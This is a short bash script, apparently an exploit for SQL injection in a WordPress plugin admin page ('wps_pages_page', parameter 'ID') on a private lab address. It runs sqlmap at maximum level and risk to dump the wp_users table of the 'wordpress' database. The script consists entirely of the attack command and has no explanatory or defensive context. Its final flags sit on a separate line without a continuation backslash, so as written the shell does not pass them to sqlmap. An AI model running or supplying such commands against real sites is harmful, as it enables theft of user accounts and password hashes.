#!/bin/bash
sqlmap -v 0 --flush-session -u "http://192.168.30.12:8080/wp-admin/admin.php?ID=1&page=wps_pages_page&type=1"  -p "ID" --batch --dump -T wp_users -D wordpress
--threads=10 --random-agent --dbms=mysql --level=5 --risk=3
